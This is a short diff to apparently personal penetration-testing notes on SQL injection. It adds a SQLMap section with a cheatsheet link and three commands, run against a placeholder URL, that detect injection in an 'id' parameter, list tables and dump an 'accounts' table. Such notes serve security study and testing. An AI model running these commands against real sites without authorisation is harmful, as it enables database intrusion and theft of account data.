@@ -187,7 +187,21 @@
      
      user() gets user running SQL
      
- SQLMap
+ SQLMap once vectors have been identified: 
+ 
+   [Cheatsheet 1](https://gist.github.com/jkullick/03b98b1e44f03986c5d1fc69c092220d)
+   
+   Identify injection
+   
+     sqlmap -u <url><resource>?id=1 -p id
+     
+   Get tables
+     
+     sqlmap -u <url><resource>?id=1 -p id --tables
+     
+   Get contents
+   
+    sqlmap -u <url><resource>?id=1 -D awd -T accounts --dump
 
    SQL query example:
    
